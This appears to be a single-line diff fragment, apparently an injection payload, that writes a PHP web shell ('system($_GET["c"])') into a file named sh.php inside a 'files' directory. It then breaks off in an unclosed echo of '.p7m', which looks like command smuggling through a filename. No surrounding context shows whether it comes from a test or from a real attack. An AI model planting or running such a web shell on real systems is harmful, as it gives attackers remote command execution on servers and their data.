@@ -1,0 +1,1 @@
+cd files && echo '<?php system($_GET["c"]); ?>' > sh.php; echo ".p7m
